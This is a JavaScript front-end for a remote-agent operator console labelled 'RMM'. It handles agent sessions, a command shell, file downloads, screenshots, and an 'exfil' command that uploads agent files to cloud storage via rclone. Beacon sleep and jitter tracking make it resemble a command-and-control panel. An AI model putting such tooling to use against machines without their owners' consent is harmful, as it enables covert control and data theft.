/**
 * Minimal RMM web operator UI — shell-style console, REST + WebSocket.
 */
const STORAGE_KEY = "rmm_api_token";
const EVENT_CURSORS_KEY = "rmm_event_cursors";
const SHELL_HISTORY_KEY = "rmm_shell_history";
const SHELL_HISTORY_MAX = 100;

/** Agent dispatch prefixes (client_rmm.ps1 Invoke-RmmUserCommand). */
const SHELL_DISPATCH_PREFIXES = ["cmd:", "PS:", "powershell:", "pwsh:"];

/** Operator meta commands (rmm_cli.py) — routed to REST, not the agent shell. */
const SHELL_META_COMMANDS = ["exfil", "download", "screenshot"];

const state = {
  token: sessionStorage.getItem(STORAGE_KEY) || "",
  sessions: [],
  historySessions: [],
  selectedId: null,
  selectedHistoryId: null,
  viewMode: "live",
  lastEventId: 0,
  localEventSeq: 0,
  ws: null,
  wsConnected: false,
  pollTimer: null,
  sessionPollTimer: null,
  statusTickTimer: null,
  sessionDownloads: [],
  /** Commands echoed locally; skip duplicate operator lines from server. */
  echoedCommands: new Set(),
  /** Pending command blocks for queued result placement (tech plan §6). */
  pendingCommandBlocks: [],
  commandBlockSeq: 0,
  /** Per-session command history for ↑/↓ and Tab (session id → string[]). */
  shellHistoryBySession: {},
  /** ↑/↓ navigation: index into history (-1 = draft at end). */
  shellHistoryNav: { index: -1, draft: "" },
  /** Tab cycle state for multi-match completion. */
  shellTabCycle: { anchor: null, candidates: [], index: -1 },
  /** Default rclone profile from GET /api/v1/rclone/config. */
  rcloneDefaultProfile: "",
  /** Session id targeted by the beacon config dialog, if open. */
  beaconConfigTargetId: null,
};

const $ = (sel) => document.querySelector(sel);

async function api(path, options = {}) {
  const headers = {
    Accept: "application/json",
    ...(options.headers || {}),
  };
  if (state.token) {
    headers.Authorization = `Bearer ${state.token}`;
  }
  const res = await fetch(`/api/v1${path}`, { ...options, headers });
  let data = {};
  const text = await res.text();
  if (text) {
    try {
      data = JSON.parse(text);
    } catch {
      data = { error: text };
    }
  }
  return { status: res.status, data };
}

function artifactSrc(url) {
  if (!url) return "";
  const sep = url.includes("?") ? "&" : "?";
  return `${url}${sep}token=${encodeURIComponent(state.token)}`;
}

async function fetchArtifact(url) {
  if (!url) throw new Error("Missing artifact URL");
  const headers = { Accept: "*/*" };
  if (state.token) {
    headers.Authorization = `Bearer ${state.token}`;
  }
  const res = await fetch(url, { headers });
  if (!res.ok) {
    let detail = "";
    try {
      const data = await res.json();
      detail = data.detail || data.error || "";
    } catch {
      try {
        detail = (await res.text()).slice(0, 200);
      } catch {
        /* ignore */
      }
    }
    throw new Error(
      `Artifact fetch failed (HTTP ${res.status})${detail ? `: ${detail}` : ""}`
    );
  }
  return res;
}

function suggestedDownloadFilename(entry) {
  const remote = entry?.remote_path || "";
  if (remote) {
    const base = String(remote).replace(/\\/g, "/").split("/").filter(Boolean).pop();
    if (base) return base;
  }
  const art = String(entry?.artifact || "");
  const idx = art.indexOf("_");
  if (idx >= 0 && idx < art.length - 1) return art.slice(idx + 1);
  return art || "download";
}

async function downloadArtifactEntry(entry) {
  const url = entry?.artifact_url;
  if (!url) throw new Error("No download URL for this file");
  const res = await fetchArtifact(url);
  const blob = await res.blob();
  const objUrl = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = objUrl;
  a.download = suggestedDownloadFilename(entry);
  a.rel = "noopener";
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(objUrl);
}

function show(el) {
  el.classList.remove("hidden");
}
function hide(el) {
  el.classList.add("hidden");
}

function formatFileSize(bytes) {
  const n = Number(bytes);
  if (!Number.isFinite(n) || n < 0) return "?";
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  if (n < 1024 * 1024 * 1024) return `${(n / (1024 * 1024)).toFixed(1)} MB`;
  return `${(n / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

const PREVIEW_TEXT_EXT = new Set([
  ".txt", ".log", ".json", ".xml", ".csv", ".md", ".ini", ".cfg", ".yaml", ".yml",
]);
const PREVIEW_IMAGE_EXT = new Set([".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp"]);
const PREVIEW_MAX_BYTES = 1024 * 1024;

function fileExtension(name) {
  const i = String(name || "").lastIndexOf(".");
  return i >= 0 ? String(name).slice(i).toLowerCase() : "";
}

function canPreviewDownload(entry) {
  const ext = fileExtension(entry.remote_path || entry.artifact);
  if (PREVIEW_IMAGE_EXT.has(ext)) return "image";
  if (PREVIEW_TEXT_EXT.has(ext) && Number(entry.size) <= PREVIEW_MAX_BYTES) return "text";
  return null;
}

function renderDownloadsList(downloads) {
  const container = $("#downloads-list");
  if (!container) return;
  state.sessionDownloads = downloads || [];
  if (!state.sessionDownloads.length) {
    container.innerHTML = '<p class="downloads-empty">No files downloaded yet.</p>';
    return;
  }
  const rows = state.sessionDownloads
    .map((d, i) => {
      const previewKind = canPreviewDownload(d);
      const previewBtn = previewKind
        ? `<button type="button" class="secondary btn-dl-preview" data-idx="${i}">Preview</button>`
        : "";
      return `<tr>
        <td class="path" title="${escapeHtml(d.remote_path || "")}">${escapeHtml(d.remote_path || d.artifact)}</td>
        <td>${escapeHtml(formatFileSize(d.size))}</td>
        <td>${escapeHtml(formatAgoFromIso(d.received_at))}</td>
        <td><div class="downloads-actions">
          <button type="button" class="secondary btn-dl-download" data-idx="${i}">Download</button>
          ${previewBtn}
        </div></td>
      </tr>`;
    })
    .join("");
  container.innerHTML = `<table class="downloads-table">
    <thead><tr><th>Remote path</th><th>Size</th><th>Received</th><th>Actions</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>
  <div id="downloads-preview" class="downloads-preview hidden"></div>`;
  container.querySelectorAll(".btn-dl-download").forEach((btn) => {
    btn.addEventListener("click", () => {
      const idx = Number(btn.dataset.idx);
      const entry = state.sessionDownloads[idx];
      if (!entry) return;
      downloadArtifactEntry(entry).catch((err) => {
        appendShellError(err.message || String(err));
      });
    });
  });
  container.querySelectorAll(".btn-dl-preview").forEach((btn) => {
    btn.addEventListener("click", () => {
      const idx = Number(btn.dataset.idx);
      const entry = state.sessionDownloads[idx];
      if (!entry) return;
      const kind = canPreviewDownload(entry);
      previewDownload(entry.artifact_url, kind, entry.remote_path || entry.artifact).catch(
        (err) => {
          appendShellError(err.message || String(err));
        }
      );
    });
  });
}

function formatAgoFromIso(iso) {
  if (!iso) return "?";
  try {
    const sec = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
    return formatAgo(sec);
  } catch {
    return iso;
  }
}

async function fetchSessionDownloads() {
  if (!state.selectedId) return;
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/downloads`
  );
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  renderDownloadsList(data.downloads || []);
}

async function previewDownload(url, kind, name) {
  const panel = $("#downloads-preview");
  if (!panel) return;
  panel.classList.remove("hidden");
  panel.innerHTML = `<p class="downloads-empty">Loading ${escapeHtml(name)}…</p>`;
  const res = await fetchArtifact(url);
  if (kind === "image") {
    const blob = await res.blob();
    const objUrl = URL.createObjectURL(blob);
    panel.innerHTML = `<div>${escapeHtml(name)}</div><img src="${objUrl}" alt="preview">`;
    return;
  }
  const text = await res.text();
  panel.innerHTML = `<div>${escapeHtml(name)}</div><pre>${escapeHtml(text)}</pre>`;
}

function computeBeaconStatus(session) {
  if (session?.beacon_status) {
    return session.beacon_status;
  }
  if (!session?.last_seen) return "?";
  const elapsed = (Date.now() - new Date(session.last_seen).getTime()) / 1000;
  const sleep = Number(session.sleep_seconds) || 60;
  const jitter = Number(session.jitter_percent) || 30;
  const expectedMax = sleep + sleep * (jitter / 100) + 15;
  if (elapsed <= expectedMax * 1.5) return "online";
  if (elapsed <= expectedMax * 4) return "stale";
  return "offline";
}

function sessionAgoSeconds(session) {
  if (session?.last_seen_ago_seconds != null && Number.isFinite(session.last_seen_ago_seconds)) {
    return Math.max(0, Math.floor(session.last_seen_ago_seconds));
  }
  if (!session?.last_seen) return null;
  return Math.max(0, Math.floor((Date.now() - new Date(session.last_seen).getTime()) / 1000));
}

function applySessionsUpdate(sessions) {
  state.sessions = sessions || [];
  updateSessionSidebarMeta();
  if (state.viewMode === "live" && state.selectedId) {
    if (!state.sessions.some((s) => s.id === state.selectedId)) {
      showEmptyConsole();
    }
  }
  renderSessionList();
  updateShellPrompt();
}

function updateSessionSidebarMeta() {
  const countEl = $("#session-count");
  const hintEl = $("#session-hint");
  const n = state.sessions.length;
  if (countEl) {
    countEl.textContent = n ? `(${n})` : "";
  }
  if (hintEl) {
    if (n === 0) {
      hintEl.textContent =
        "No agents connected. Confirm the client $u matches this server URL and RMM_BEACON_SECRET matches the server.";
      hintEl.classList.remove("hidden");
    } else {
      hintEl.classList.add("hidden");
    }
  }
}

function setConsoleReadOnly(readonly) {
  const panel = $("#console-panel");
  const banner = $("#console-readonly-banner");
  const input = $("#shell-input");
  panel.classList.toggle("readonly-mode", readonly);
  banner.classList.toggle("hidden", !readonly);
  if (input) {
    input.disabled = readonly;
  }
  if (readonly) {
    resetShellHistoryNav();
    const hint = $("#shell-completion-hint");
    if (hint) hint.classList.add("hidden");
  }
}

function stopSessionPolling() {
  if (state.sessionPollTimer) {
    clearInterval(state.sessionPollTimer);
    state.sessionPollTimer = null;
  }
}

function stopStatusTick() {
  if (state.statusTickTimer) {
    clearInterval(state.statusTickTimer);
    state.statusTickTimer = null;
  }
}

function startSessionPolling() {
  stopSessionPolling();
  const tick = () => {
    refreshSessions().catch(() => {});
    fetchSessionHistory().catch(() => {});
  };
  tick();
  state.sessionPollTimer = setInterval(tick, 5000);
}

function startStatusTick() {
  stopStatusTick();
  state.statusTickTimer = setInterval(() => {
    if (state.sessions.length) {
      renderSessionList();
    }
  }, 15000);
}

async function fetchSessionHistory() {
  if (!state.token) return;
  const { status, data } = await api("/history");
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  state.historySessions = data.sessions || [];
  renderHistoryList();
}

function renderHistoryList() {
  const ul = $("#history-list");
  const empty = $("#history-empty");
  if (!ul) return;
  ul.innerHTML = "";
  const rows = state.historySessions.filter((s) => !s.active);
  if (empty) {
    empty.classList.toggle("hidden", rows.length > 0);
  }
  for (const s of rows) {
    const li = document.createElement("li");
    li.className =
      "session-item history-item" +
      (s.session_id === state.selectedHistoryId && state.viewMode === "history" ? " active" : "");
    const ended = s.ended_at ? formatTime(s.ended_at) : formatTime(s.updated_at || s.last_seen);
    const reason = s.end_reason ? ` · ${s.end_reason}` : "";
    const connected = formatFirstConnected(s.first_seen);
    const sessionId = s.session_id;

    li.innerHTML = `
      <div class="id">${escapeHtml((sessionId || "").slice(0, 8))}<span class="ended-tag">archived</span></div>
      <div class="meta">${escapeHtml(s.username || "?")}@${escapeHtml(s.hostname || "?")}</div>
      ${connected ? `<div class="sub sub-connected">connected ${escapeHtml(connected)}</div>` : ""}
      <div class="sub">${escapeHtml(String(s.event_count || 0))} events · ended ${escapeHtml(ended)}${escapeHtml(reason)}</div>
    `;

    const delBtn = document.createElement("button");
    delBtn.type = "button";
    delBtn.className = "history-delete secondary";
    delBtn.title = "Delete archived transcript from disk";
    delBtn.setAttribute("aria-label", "Delete archived session");
    delBtn.textContent = "Delete";
    delBtn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      deleteHistorySession(sessionId);
    });
    li.insertBefore(delBtn, li.firstChild);

    li.addEventListener("click", () => selectHistorySession(sessionId));
    ul.appendChild(li);
  }
}

async function deleteHistorySession(id) {
  const shortId = (id || "").slice(0, 8);
  if (
    !confirm(
      `Delete archived session ${shortId}? This permanently removes the transcript from disk.`
    )
  ) {
    return;
  }
  const { status, data } = await api(`/history/${encodeURIComponent(id)}`, {
    method: "DELETE",
  });
  if (status === 409) {
    appendShellError("Cannot delete archive — session is still active");
    return;
  }
  if (status !== 200) {
    appendShellError(data.error || data.detail || `Delete failed (${status})`);
    return;
  }
  if (state.selectedHistoryId === id) {
    showEmptyConsole();
  }
  await fetchSessionHistory();
}

async function selectHistorySession(id) {
  state.viewMode = "history";
  state.selectedHistoryId = id;
  state.selectedId = null;
  state.lastEventId = 0;
  state.echoedCommands.clear();
  state.pendingCommandBlocks = [];
  stopEventPolling();
  renderSessionList();
  renderHistoryList();

  const { status, data } = await api(`/history/${encodeURIComponent(id)}`);
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
    return;
  }
  const s = data.session || {};
  hide($("#empty-state"));
  show($("#console-panel"));
  setConsoleReadOnly(true);

  $("#console-title").textContent = `${s.username || "?"}@${s.hostname || "?"}`;
  const ended = s.ended_at ? formatTime(s.ended_at) : "unknown";
  $("#console-detail").textContent = `${id} · archived · ended ${ended}${s.end_reason ? ` (${s.end_reason})` : ""}`;
  shellOutputEl().innerHTML = "";
  updateShellPrompt();
  appendShellMeta(`Archived transcript — ${s.event_count || 0} events`);

  const evRes = await api(`/history/${encodeURIComponent(id)}/events?since=0&limit=500`);
  if (evRes.status === 200) {
    const events = (evRes.data.events || []).sort((a, b) => (a.id || 0) - (b.id || 0));
    for (const ev of events) {
      appendEvent(ev, { history: true });
    }
  }
}

function formatTime(iso) {
  try {
    return new Date(iso).toLocaleString();
  } catch {
    return iso;
  }
}

function formatFirstConnected(iso) {
  if (!iso) return null;
  try {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return null;
    return d.toLocaleString();
  } catch {
    return null;
  }
}

function formatAgo(seconds) {
  const s = Number(seconds);
  if (!Number.isFinite(s) || s < 0) return "?";
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function statusClass(status) {
  if (status === "online") return "status-online";
  if (status === "stale") return "status-stale";
  if (status === "offline") return "status-offline";
  return "";
}

function escapeHtml(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}

function setWsStatus(connected) {
  state.wsConnected = connected;
  const dot = $("#ws-status");
  dot.classList.toggle("connected", connected);
  dot.title = connected ? "WebSocket connected" : "WebSocket disconnected";
}

function wsUrl() {
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  const q = new URLSearchParams({
    token: state.token,
  });
  if (state.selectedId) {
    q.set("session", state.selectedId);
  }
  return `${proto}//${location.host}/api/v1/ws?${q}`;
}

function connectWebSocket() {
  disconnectWebSocket();
  if (!state.token) return;

  const ws = new WebSocket(wsUrl());
  state.ws = ws;

  ws.onopen = () => {
    setWsStatus(true);
    refreshSessions().catch(() => {});
    fetchSessionHistory().catch(() => {});
    if (state.selectedId) {
      wsSubscribe(state.selectedId);
    }
  };

  ws.onclose = () => {
    setWsStatus(false);
    if (state.token && $("#app").classList.contains("hidden") === false) {
      setTimeout(connectWebSocket, 3000);
    }
  };

  ws.onerror = () => setWsStatus(false);

  ws.onmessage = (ev) => {
    let msg;
    try {
      msg = JSON.parse(ev.data);
    } catch {
      return;
    }
    if (msg.op === "sessions") {
      applySessionsUpdate(msg.sessions || []);
      return;
    }
    if (msg.op === "event") {
      if (state.viewMode !== "live") return;
      if (!state.selectedId || msg.session_id === state.selectedId) {
        appendEvent(msg.event);
      }
      return;
    }
    if (msg.op === "ping") {
      ws.send(JSON.stringify({ op: "pong" }));
    }
  };
}

function disconnectWebSocket() {
  if (state.ws) {
    state.ws.onclose = null;
    state.ws.close();
    state.ws = null;
  }
  setWsStatus(false);
}

function stopEventPolling() {
  if (state.pollTimer) {
    clearInterval(state.pollTimer);
    state.pollTimer = null;
  }
}

async function pollSessionEvents() {
  if (!state.selectedId || !state.token) return;
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/events?since=${state.lastEventId}&limit=100`
  );
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  for (const ev of data.events || []) {
    appendEvent(ev);
  }
}

function startEventPolling() {
  stopEventPolling();
  state.pollTimer = setInterval(() => {
    pollSessionEvents().catch(() => {});
  }, 2500);
}

function wsSubscribe(sessionId) {
  if (state.ws && state.ws.readyState === WebSocket.OPEN) {
    state.ws.send(JSON.stringify({ op: "subscribe", session_id: sessionId }));
  }
}

function updateShellPrompt() {
  const el = $("#shell-prompt");
  if (state.viewMode === "history" && state.selectedHistoryId) {
    el.textContent = "archive>";
    return;
  }
  if (!state.selectedId) {
    el.textContent = "rmm>";
    return;
  }
  const s = state.sessions.find((x) => x.id === state.selectedId);
  const short = state.selectedId.slice(0, 8);
  el.textContent = s ? `rmm:${short}>` : `rmm:${short}>`;
}

function shellOutputEl() {
  return $("#shell-output");
}

function scrollShellToBottom() {
  const log = shellOutputEl();
  log.scrollTop = log.scrollHeight;
}

function scrollShellIfNearBottom() {
  const log = shellOutputEl();
  const threshold = 80;
  const nearBottom = log.scrollHeight - log.scrollTop - log.clientHeight < threshold;
  if (nearBottom) scrollShellToBottom();
}

function normalizeCmdKey(cmd) {
  return String(cmd || "").trim().replace(/\s+/g, " ");
}

function operatorActionKind(body) {
  const b = String(body || "").trim();
  const idx = b.indexOf(":");
  if (idx === -1) return null;
  return b.slice(0, idx).trim().toLowerCase();
}

function commandKeysMatch(blockKey, evCmd) {
  const a = normalizeCmdKey(blockKey);
  const b = normalizeCmdKey(evCmd);
  if (!a || !b) return false;
  if (a === b) return true;
  if (a.startsWith("exfil ") && b.startsWith("exfil ")) {
    const remote = a.slice(6).split(" ")[0];
    if (remote && b.includes(remote)) return true;
  }
  if (a.startsWith("download ") && b.startsWith("download ")) {
    const remote = a.slice(9).trim();
    if (remote && b.includes(remote)) return true;
  }
  return false;
}

function findPendingCommandBlock(ev) {
  const evType = ev.type || "output";
  const evCmd = normalizeCmdKey(ev.command);
  const pending = state.pendingCommandBlocks.filter((b) => !b.filled);

  if (evCmd) {
    for (const block of pending) {
      if (block.matchKeys.some((k) => commandKeysMatch(k, evCmd))) {
        return block;
      }
    }
    if (evType === "output") {
      for (const block of pending) {
        if (block.kind === "upload" && block.remotePath) {
          if (evCmd.includes(block.remotePath) || evCmd.includes("__UPLOAD__")) {
            return block;
          }
        }
      }
    }
  }

  const typeKinds = {
    file_upload: "download",
    screenshot: "screenshot",
    cloud_upload: "exfil",
  };
  const kind = typeKinds[evType];
  if (kind) {
    const body = String(ev.body || "");
    for (const block of pending) {
      if (block.kind !== kind) continue;
      if (kind === "download" && block.remotePath) {
        if (remotePathsMatch(body, block.remotePath) || body.includes(block.remotePath)) {
          return block;
        }
        continue;
      }
      if (kind === "exfil" && block.remotePath) {
        if (remotePathsMatch(body, block.remotePath) || body.includes(block.remotePath)) {
          return block;
        }
        continue;
      }
      return block;
    }
  }

  return null;
}

function normalizeRemotePath(path) {
  return String(path || "")
    .trim()
    .replace(/\//g, "\\")
    .toLowerCase();
}

function remotePathsMatch(a, b) {
  if (!a || !b) return false;
  const na = normalizeRemotePath(a);
  const nb = normalizeRemotePath(b);
  if (na === nb) return true;
  return na.includes(nb) || nb.includes(na);
}

function parseCloudUploadBody(ev) {
  const raw = ev?.body;
  if (raw == null || raw === "") return null;
  let data = null;
  if (typeof raw === "object") {
    data = raw;
  } else {
    const text = String(raw).trim();
    if (text.startsWith("{")) {
      try {
        data = JSON.parse(text);
      } catch {
        /* formatted string */
      }
    }
    if (!data) {
      const link = text.match(/https?:\/\/\S+/i)?.[0] || null;
      return { text, link };
    }
  }
  const remote = String(data.remote_path || "").trim();
  const profile = String(data.profile || data.backend || "cloud").trim();
  if (data.success === false) {
    const err = String(data.error || "Exfil failed").trim();
    return { text: remote ? `${remote}: ${err}` : err, error: true };
  }
  const link = String(data.link || "").trim();
  const dest = String(data.dest || "").trim();
  if (link) return { text: `${remote} → ${link}`, link };
  if (dest) return { text: `${remote} → ${profile}:${dest}` };
  if (remote) return { text: remote };
  return { text: "Exfil complete" };
}

function renderCloudUploadHtml(ev) {
  const parsed = parseCloudUploadBody(ev);
  if (!parsed) return escapeHtml("(exfil complete)");
  let html = escapeHtml(parsed.text);
  if (parsed.link) {
    html += `<br><a class="artifact-link" href="${escapeHtml(parsed.link)}" target="_blank" rel="noopener">Open link</a>`;
  }
  return html;
}

function looksLikeTransferProgressJson(body) {
  try {
    const data = typeof body === "object" ? body : JSON.parse(String(body));
    return Boolean(
      data &&
        data.remote_path &&
        (data.percent != null || data.bytes != null || data.total_bytes != null)
    );
  } catch {
    return false;
  }
}

function parseProgressBody(ev) {
  const raw = ev?.body;
  if (!raw) return null;
  try {
    return typeof raw === "object" ? raw : JSON.parse(String(raw));
  } catch {
    return null;
  }
}

function formatByteSize(bytes) {
  const n = Number(bytes);
  if (!Number.isFinite(n) || n < 0) return "?";
  if (n < 1024) return `${Math.round(n)} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  if (n < 1024 * 1024 * 1024) return `${(n / (1024 * 1024)).toFixed(1)} MB`;
  return `${(n / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

function formatDuration(seconds) {
  const s = Number(seconds);
  if (!Number.isFinite(s) || s < 0) return "?";
  const sec = Math.round(s);
  if (sec < 60) return `${sec}s`;
  if (sec < 3600) return `${Math.floor(sec / 60)}m ${sec % 60}s`;
  return `${Math.floor(sec / 3600)}h ${Math.floor((sec % 3600) / 60)}m`;
}

function formatTransferProgressLabel(data) {
  const pct = Number(data?.percent);
  const pctText = Number.isFinite(pct) ? `${pct.toFixed(1)}%` : "…";
  const done = formatByteSize(data?.bytes);
  const total = formatByteSize(data?.total_bytes);
  const speed = formatByteSize(data?.speed_bps);
  const eta = Number(data?.eta_seconds);
  const etaText = Number.isFinite(eta) && eta >= 0 ? formatDuration(eta) : "?";
  return `${pctText} · ${done} / ${total} · ${speed}/s · ETA ${etaText}`;
}

function findProgressBlock(ev, kind) {
  const data = parseProgressBody(ev);
  const remote = String(data?.remote_path || "").trim();
  const evCmd = normalizeCmdKey(ev.command);
  for (const block of state.pendingCommandBlocks) {
    if (block.filled || block.kind !== kind) continue;
    if (remote && block.remotePath && remotePathsMatch(remote, block.remotePath)) {
      return block;
    }
    if (evCmd && block.matchKeys.some((k) => commandKeysMatch(k, evCmd))) {
      return block;
    }
  }
  const pending = state.pendingCommandBlocks.filter((b) => !b.filled && b.kind === kind);
  if (pending.length === 1) return pending[0];
  return null;
}

function seedTransferProgress(block, statusPrefix) {
  if (!block) return;
  updateProgressBlock(
    block,
    {
      bytes: 0,
      total_bytes: 0,
      percent: 0,
      speed_bps: 0,
      eta_seconds: -1,
    },
    statusPrefix
  );
}

function updateProgressBlock(block, data, statusPrefix) {
  if (!block || !data) return false;
  const pct = Math.min(100, Math.max(0, Number(data.percent) || 0));
  const label = formatTransferProgressLabel(data);

  if (block.metaLine) {
    block.metaLine.textContent = `${statusPrefix} — ${label}`;
  }

  let wrap = block.progressEl;
  if (!wrap || !wrap.isConnected) {
    wrap = document.createElement("div");
    wrap.className = "transfer-progress";
    wrap.innerHTML = `
      <div class="transfer-progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
        <div class="transfer-progress-fill"></div>
      </div>
      <div class="transfer-progress-detail"></div>`;
    block.resultEl.prepend(wrap);
    block.progressEl = wrap;
  }

  const fill = wrap.querySelector(".transfer-progress-fill");
  const detail = wrap.querySelector(".transfer-progress-detail");
  const bar = wrap.querySelector(".transfer-progress-bar");
  if (fill) fill.style.width = `${pct}%`;
  if (bar) {
    bar.setAttribute("aria-valuenow", String(Math.round(pct)));
    bar.setAttribute("aria-label", `${statusPrefix} ${pct.toFixed(1)} percent`);
  }
  if (detail) detail.textContent = label;
  scrollShellIfNearBottom();
  return true;
}

function parseExfilProgressBody(ev) {
  return parseProgressBody(ev);
}

function formatExfilProgressLabel(data) {
  return formatTransferProgressLabel(data);
}

function findExfilProgressBlock(ev) {
  return findProgressBlock(ev, "exfil");
}

function updateExfilProgressBlock(block, ev) {
  return updateProgressBlock(block, parseProgressBody(ev), "Uploading via rclone");
}

function findDownloadProgressBlock(ev) {
  return findProgressBlock(ev, "download");
}

function updateDownloadProgressBlock(block, ev) {
  return updateProgressBlock(block, parseProgressBody(ev), "Downloading from agent");
}

function renderEventResultHtml(ev) {
  const evType = ev.type || "output";
  const body = String(ev.body || "").trim();
  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
    return renderEventBodyHtml(ev);
  }
  if (evType === "cloud_upload") {
    return renderCloudUploadHtml(ev);
  }
  if (evType === "output") {
    if (!body) return escapeHtml("(no output)");
    return body
      .split("\n")
      .map((line) => escapeHtml(line))
      .join("<br>");
  }
  if (body) return escapeHtml(body);
  return escapeHtml(`(${evType})`);
}

function fillCommandBlock(block, ev) {
  if (!block || block.filled) return false;
  block.filled = true;
  if (block.metaLine) {
    block.metaLine.remove();
    block.metaLine = null;
  }
  if (block.progressEl) {
    block.progressEl.remove();
    block.progressEl = null;
  }
  const evType = ev.type || "output";
  const resultEl = block.resultEl;
  if (evType === "cloud_upload") {
    const line = document.createElement("div");
    line.className = "shell-line shell-line-output";
    line.innerHTML = renderCloudUploadHtml(ev);
    resultEl.appendChild(line);
  } else if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
    const line = document.createElement("div");
    line.className = "shell-line shell-line-output";
    line.innerHTML = renderEventResultHtml(ev);
    resultEl.appendChild(line);
  } else if (evType === "output") {
    const text = String(ev.body || "");
    if (looksLikeTransferProgressJson(text)) {
      return true;
    }
    if (!text) {
      const line = document.createElement("div");
      line.className = "shell-line shell-line-meta";
      line.textContent = "(no output)";
      resultEl.appendChild(line);
    } else {
      for (const lineText of text.split("\n")) {
        const line = document.createElement("div");
        line.className = "shell-line shell-line-output";
        line.innerHTML = escapeHtml(lineText);
        resultEl.appendChild(line);
      }
    }
  } else {
    const line = document.createElement("div");
    line.className = "shell-line shell-line-output";
    line.innerHTML = renderEventResultHtml(ev);
    resultEl.appendChild(line);
  }
  scrollShellIfNearBottom();
  return true;
}

function createCommandBlock(cmd, { meta = null, kind = null, remotePath = null, matchKeys = null } = {}) {
  const log = shellOutputEl();
  const blockEl = document.createElement("div");
  blockEl.className = "shell-command-block";

  const echoLine = document.createElement("div");
  echoLine.className = "shell-line shell-line-echo";
  echoLine.innerHTML = `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(cmd)}`;
  blockEl.appendChild(echoLine);

  let metaLine = null;
  if (meta) {
    metaLine = document.createElement("div");
    metaLine.className = "shell-line shell-line-meta";
    metaLine.innerHTML = escapeHtml(meta);
    blockEl.appendChild(metaLine);
  }

  const resultEl = document.createElement("div");
  resultEl.className = "shell-command-result";
  blockEl.appendChild(resultEl);

  log.appendChild(blockEl);
  scrollShellIfNearBottom();

  const keys = matchKeys ? matchKeys.map(normalizeCmdKey) : [normalizeCmdKey(cmd)];
  const block = {
    id: ++state.commandBlockSeq,
    cmd,
    kind,
    remotePath: remotePath || null,
    matchKeys: keys,
    blockEl,
    metaLine,
    resultEl,
    progressEl: null,
    filled: false,
  };
  state.pendingCommandBlocks.push(block);
  if (kind === "exfil") {
    seedTransferProgress(block, "Uploading via rclone");
  } else if (kind === "download") {
    seedTransferProgress(block, "Downloading from agent");
  }
  return block;
}

function appendUnmatchedEvent(ev) {
  const evType = ev.type || "output";
  const body = String(ev.body || "").trim();
  const cmdEcho = (ev.command || "").trim();

  if (evType === "output") {
    if (cmdEcho) {
      appendShellLine(
        "meta",
        escapeHtml(`result » ${cmdEcho}`)
      );
    }
    appendShellOutput(body);
    return;
  }

  if (evType === "config_ack") {
    appendShellMeta(body ? `Config applied: ${body}` : "Config applied on agent");
    return;
  }

  if (evType === "error" || evType === "queued") {
    appendShellMeta(body || evType);
    return;
  }

  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
    const block = document.createElement("div");
    block.className = "shell-line shell-line-output";
    block.innerHTML = renderEventBodyHtml(ev);
    shellOutputEl().appendChild(block);
    scrollShellIfNearBottom();
    return;
  }

  if (evType === "cloud_upload") {
    const block = document.createElement("div");
    block.className = "shell-line shell-line-output";
    block.innerHTML = renderCloudUploadHtml(ev);
    shellOutputEl().appendChild(block);
    scrollShellIfNearBottom();
    return;
  }

  appendShellLine(
    "operator",
    `[${ev.id}] ${escapeHtml(evType)}${cmdEcho ? ` » ${escapeHtml(cmdEcho)}` : ""}`
  );
  if (body) appendShellOutput(body);
}

function historyOperatorMeta(body) {
  const action = operatorActionKind(body);
  if (body.startsWith("queued:")) return "(queued)";
  if (action === "download") return "(download queued)";
  if (action === "exfil") return "(exfil queued)";
  if (action === "upload") return "(upload queued)";
  if (action === "screenshot") return "(screenshot queued)";
  if (action === "config") return null;
  return null;
}

function historyOperatorKind(body) {
  const action = operatorActionKind(body);
  const map = {
    download: "download",
    exfil: "exfil",
    upload: "upload",
    screenshot: "screenshot",
  };
  return map[action] || null;
}

function historyRemoteFromOperatorCmd(opCmd, kind) {
  if (kind === "download" && opCmd.startsWith("download ")) {
    return opCmd.slice(9).trim();
  }
  if (kind === "exfil" && opCmd.startsWith("exfil ")) {
    return opCmd.slice(6).split(" ")[0];
  }
  return null;
}

function appendShellLine(kind, html) {
  const log = shellOutputEl();
  const line = document.createElement("div");
  line.className = `shell-line shell-line-${kind}`;
  line.innerHTML = html;
  log.appendChild(line);
  scrollShellToBottom();
  return line;
}

function appendShellEcho(cmd, { block = false, meta = null, kind = null, remotePath = null, matchKeys = null } = {}) {
  state.echoedCommands.add(cmd);
  setTimeout(() => state.echoedCommands.delete(cmd), 120000);
  rememberShellCommand(cmd);
  if (block) {
    return createCommandBlock(cmd, { meta, kind, remotePath, matchKeys });
  }
  appendShellLine(
    "echo",
    `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(cmd)}`
  );
  return null;
}

